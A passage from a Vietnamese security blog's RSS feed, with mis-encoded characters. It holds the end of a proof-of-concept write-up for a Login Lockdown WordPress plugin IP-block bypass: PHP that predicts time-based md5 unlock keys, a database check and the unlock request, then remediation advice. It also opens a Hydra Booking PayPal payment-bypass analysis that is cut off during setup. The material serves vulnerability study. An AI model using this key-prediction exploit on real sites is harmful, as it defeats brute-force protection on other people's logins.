wordpress_test_cookie=WP%20Cookie%20check\r\n&amp;#34;,&#xA;        &amp;#34;content&amp;#34; =&amp;gt; $data,&#xA;        &amp;#34;ignore_errors&amp;#34; =&amp;gt; true&#xA;    ]&#xA;];&#xA;&#xA;$context = stream_context_create($opts);&#xA;$response = file_get_contents($url, false, $context);&#xA;&#xA;echo $response;&#xA;&#xA;$now = time();&#xA;&#xA;for ($t = $now - 1; $t &amp;lt;= $now &amp;#43; 1; $t&amp;#43;&amp;#43;) {&#xA;    for ($r = 9999; $r &amp;lt;= 10000; $r&amp;#43;&amp;#43;) {&#xA;        echo md5($t . $r) . PHP_EOL;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Do &lt;code&gt;unblock_key&lt;/code&gt; ƒë∆∞·ª£c sinh d·ª±a tr√™n &lt;code&gt;time()&lt;/code&gt; (ƒë·ªô ch√≠nh x√°c theo &lt;strong&gt;gi√¢y&lt;/strong&gt;), k·∫ª t·∫•n c√¥ng ch·ªâ c·∫ßn t·∫°o c√°c gi√° tr·ªã key trong kho·∫£ng &lt;strong&gt;¬±1 gi√¢y&lt;/strong&gt; so v·ªõi th·ªùi ƒëi·ªÉm g·ª≠i request recovery.&#xA;V·ªõi m·ªói timestamp ch·ªâ c√≥ r·∫•t √≠t gi√° tr·ªã ng·∫´u nhi√™n kh·∫£ dƒ©, t·ªïng kh√¥ng gian t√¨m ki·∫øm l√† &lt;strong&gt;r·∫•t nh·ªè&lt;/strong&gt;, cho ph√©p th·ª≠ to√†n b·ªô c√°c key h·ª£p l·ªá trong th·ªùi gian ng·∫Øn khi transient v·∫´n c√≤n hi·ªáu l·ª±c.&lt;/p&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ch·∫°y file &lt;code&gt;gen_key.php&lt;/code&gt; ƒë·ªÉ l·∫•y key:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;‚îå‚îÄ‚îÄ(w41üéÉw41)-[~/Pentest/tmp]&#xA;‚îî‚îÄ$ gen_key.php &#xA;... &#xA;98b65fa71ca7a0f5aeefc93082c6a381&#xA;72a72562252bcd5c005bfbce95d72bea&#xA;f98100c86d0bd348eeb18332ac85756b&#xA;63894ea709e4be84967328ad37392043&#xA;f67370456015246850e783fbb406a176&#xA;bf31356071a060b3d9d12d9dc3711b30&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Key ƒë∆∞·ª£c l∆∞u trong database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT option_name, option_value  FROM wp_options  WHERE option_name LIKE &amp;#39;%loginlockdown_unlock_%&amp;#39;;&#xA;&amp;#43;--------------------------------------------------------------------------&amp;#43;----------------------------------&amp;#43;&#xA;| option_name                                                              | option_value                     |&#xA;&amp;#43;--------------------------------------------------------------------------&amp;#43;----------------------------------&amp;#43;&#xA;| _transient_timeout_loginlockdown_unlock_count_1                          | 1769100607                       |&#xA;| _transient_loginlockdown_unlock_count_1                                  | 1                                |&#xA;| _transient_timeout_loginlockdown_unlock_f98100c86d0bd348eeb18332ac85756b | 1769100607                       |&#xA;| _transient_loginlockdown_unlock_f98100c86d0bd348eeb18332ac85756b         | f98100c86d0bd348eeb18332ac85756b |&#xA;&amp;#43;--------------------------------------------------------------------------&amp;#43;----------------------------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Tr√πng v·ªõi key ta ƒë√£ t·∫°o ·ªü tr√™n&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request unlock&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /?loginlockdown_unblock=f98100c86d0bd348eeb18332ac85756b HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-22-cve-2025-11707/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-22-cve-2025-11707/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-22-cve-2025-11707/result.png&#39; alt=&#34;Result&#34; height=&#34;588&#34; width=&#34;1359&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong plugin &lt;strong&gt;Login Lockdown &amp;amp; Protection ‚â§ 2.14&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øt k·∫ø c∆° ch·∫ø recovery kh√¥ng an to√†n. M·∫∑c d√π quy tr√¨nh m·ªü kh√≥a ƒë∆∞·ª£c x√¢y d·ª±ng v·ªõi m·ª•c ƒë√≠ch y√™u c·∫ßu administrator x√°c nh·∫≠n qua email, nh∆∞ng tr√™n th·ª±c t·∫ø, &lt;strong&gt;vi·ªác sinh v√† ki·ªÉm tra &lt;code&gt;unblock_key&lt;/code&gt; kh√¥ng r√†ng bu·ªôc v·ªõi ng∆∞·ªùi d√πng, IP hay session&lt;/strong&gt;, ƒë·ªìng th·ªùi s·ª≠ d·ª•ng ngu·ªìn entropy r·∫•t th·∫•p. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ &lt;strong&gt;t·ª± t·∫°o v√† th·ª≠ c√°c kh√≥a h·ª£p l·ªá trong th·ªùi gian ng·∫Øn&lt;/strong&gt;, t·ª´ ƒë√≥ m·ªü kh√≥a IP c·ªßa ch√≠nh m√¨nh m√† kh√¥ng c·∫ßn truy c·∫≠p v√†o email c·ªßa qu·∫£n tr·ªã vi√™n. K·∫øt qu·∫£ l√† to√†n b·ªô c∆° ch·∫ø ch·∫∑n IP sau nhi·ªÅu l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i c√≥ th·ªÉ b·ªã v√¥ hi·ªáu h√≥a.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;C∆° ch·∫ø b·∫£o m·∫≠t d·ª±a tr√™n &lt;strong&gt;email confirmation&lt;/strong&gt; s·∫Ω kh√¥ng c√≤n √Ω nghƒ©a n·∫øu &lt;strong&gt;token c√≥ th·ªÉ b·ªã ƒëo√°n ƒë∆∞·ª£c&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Token d√πng cho c√°c h√†nh ƒë·ªông nh·∫°y c·∫£m ph·∫£i c√≥ &lt;strong&gt;entropy cao&lt;/strong&gt;, kh√¥ng ƒë∆∞·ª£c d·ª±a v√†o &lt;code&gt;time()&lt;/code&gt; ho·∫∑c ngu·ªìn ng·∫´u nhi√™n c√≥ kh√¥ng gian t√¨m ki·∫øm nh·ªè.&lt;/li&gt;&#xA;&lt;li&gt;Recovery token c·∫ßn ƒë∆∞·ª£c &lt;strong&gt;r√†ng bu·ªôc v·ªõi ng·ªØ c·∫£nh&lt;/strong&gt; (IP, user, session, ho·∫∑c request) thay v√¨ ch·ªâ t·ªìn t·∫°i ƒë·ªôc l·∫≠p trong h·ªá th·ªëng.&lt;/li&gt;&#xA;&lt;li&gt;Logic x·ª≠ l√Ω m·ªü kh√≥a ƒë∆∞·ª£c g·∫Øn v√†o hook &lt;code&gt;init&lt;/code&gt; khi·∫øn endpoint m·ªü kh√≥a c√≥ th·ªÉ b·ªã k√≠ch ho·∫°t t·ª´ &lt;strong&gt;b·∫•t k·ª≥ request n√†o&lt;/strong&gt;, l√†m tƒÉng b·ªÅ m·∫∑t t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;li&gt;C√°c c∆° ch·∫ø gi·ªõi h·∫°n (rate-limit) n·∫øu ch·ªâ g·∫Øn v·ªõi &lt;strong&gt;user ID&lt;/strong&gt; m√† kh√¥ng g·∫Øn v·ªõi IP ho·∫∑c request source c√≥ th·ªÉ b·ªã l·∫°m d·ª•ng trong k·ªãch b·∫£n t·∫•n c√¥ng ch∆∞a x√°c th·ª±c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/login-lockdown/vulnerability/wordpress-login-lockdown-protection-plugin-2-14-ip-block-bypass-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Login Lockdown Plugin &amp;lt;= 2.14 is vulnerable to Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12788 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-15-cve-2025-12788/</link>
      <pubDate>Thu, 15 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-15-cve-2025-12788/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Hydra Booking ‚Äî Appointment Scheduling &amp;amp; Booking Calendar&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; b·ªã &lt;strong&gt;l·ªó h·ªïng thi·∫øu x√°c minh thanh to√°n&lt;/strong&gt;, cho ph√©p &lt;strong&gt;b·ªè qua thanh to√°n m√† kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt; trong &lt;strong&gt;t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn v√† bao g·ªìm 1.1.27&lt;/strong&gt;. Nguy√™n nh√¢n l√† do plugin &lt;strong&gt;ch·∫•p nh·∫≠n d·ªØ li·ªáu x√°c nh·∫≠n thanh to√°n do ph√≠a client ki·ªÉm so√°t&lt;/strong&gt; trong h√†m &lt;strong&gt;&lt;code&gt;tfhb_meeting_paypal_payment_confirmation_callback&lt;/code&gt;&lt;/strong&gt; m√† &lt;strong&gt;kh√¥ng x√°c minh ph√≠a m√°y ch·ªß v·ªõi API c·ªßa PayPal&lt;/strong&gt;. ƒêi·ªÅu n√†y khi·∫øn &lt;strong&gt;k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;v∆∞·ª£t qua y√™u c·∫ßu thanh to√°n&lt;/strong&gt; v√† &lt;strong&gt;x√°c nh·∫≠n ƒë·∫∑t l·ªãch l√† ƒë√£ thanh to√°n&lt;/strong&gt; m√† &lt;strong&gt;kh√¥ng c√≥ b·∫•t k·ª≥ giao d·ªãch thanh to√°n th·ª±c t·∫ø n√†o x·∫£y ra&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12788&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12788&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Bypass Vulnerability&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.27&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.28&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hydra-booking/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hydra Booking Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Hydra Booking&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.27&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.28&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Theo m√¥ t·∫£ c·ªßa CVE, l·ªó h·ªïng x·∫£y ra do h·ªá th·ªëng cho ph√©p ng∆∞·ªùi d√πng &lt;strong&gt;ƒë·∫∑t l·ªãch v√† ƒë∆∞·ª£c ƒë√°nh d·∫•u l√† ƒë√£ thanh to√°n&lt;/strong&gt; m√† &lt;strong&gt;kh√¥ng c√≥ b·∫•t k·ª≥ giao d·ªãch thanh to√°n th·ª±c t·∫ø n√†o&lt;/strong&gt;, v√¨ &lt;strong&gt;kh√¥ng th·ª±c hi·ªán x√°c minh ph√≠a m√°y ch·ªß v·ªõi API c·ªßa PayPal&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ thanh to√°n b·∫±ng PayPal, ta truy c·∫≠p &lt;code&gt;Hydra Booking&lt;/code&gt; &amp;gt; &lt;code&gt;Settings&lt;/code&gt; &amp;gt; &lt;code&gt;Integrations&lt;/code&gt; v√† enable PayPal ·ªü ch·∫ø ƒë·ªô &lt;code&gt;SandBox&lt;/code&gt; khi setup local.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/setup.png&#34; title=&#34;Thi·∫øt l·∫≠p PayPal&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/setup.png&#34; data-sub-html=&#34;&lt;h2&gt;Setup PayPal&lt;/h2&gt;&lt;p&gt;Thi·∫øt l·∫≠p PayPal&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/setup.png&#39; alt=&#34;Setup PayPal&#34; height=&#34;1042&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thi·∫øt l·∫≠p PayPal&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo, ta c·∫ßn setup gi√° cho booking t·∫°i:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=hydra-booking#/meetings/single/{meeting_id}/payment&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/setup_price.png&#34; title=&#34;Thi·∫øt l·∫≠p gi√° cho meeting&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/setup_price.png&#34; data-sub-html=&#34;&lt;h2&gt;Setup price&lt;/h2&gt;&lt;p&gt;Thi·∫øt l·∫≠p gi√° cho meeting&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/setup_price.png&#39; alt=&#34;Setup price&#34; height=&#34;1048&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thi·∫øt l·∫≠p gi√° cho meeting&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quy tr√¨nh thanh to√°n c·ªßa ·ª©ng d·ª•ng g·ªìm 2 b∆∞·ªõc:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Booking (ƒê·∫∑t l·ªãch)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Payment (Thanh to√°n)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;booking&#34;&gt;&lt;span&gt;Booking&lt;/span&gt;&#xA;  &lt;a href=&#34;#booking&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Click v√†o &lt;code&gt;Preview&lt;/code&gt; trong meeting ƒë√£ t·∫°o ƒë·ªÉ redirect sang trang booking.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-15-cve-2025-12788/preview.png&#34; title=&#34;Trang booking&#34; data-thumbnail=&#34;/posts/2026-01-15-cve-2025-12788/preview.png&#34; data-sub-html=&#34;&lt;h2&gt;Preview&lt;/h2&gt;&lt;p&gt;Trang booking&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-15-cve-2025-12788/preview.png&#39; alt=&#34;Preview&#34; height=&#34;665&#34; width=&#34;856&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Trang booking&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ xem tr·∫°ng th√°i booking, ta truy 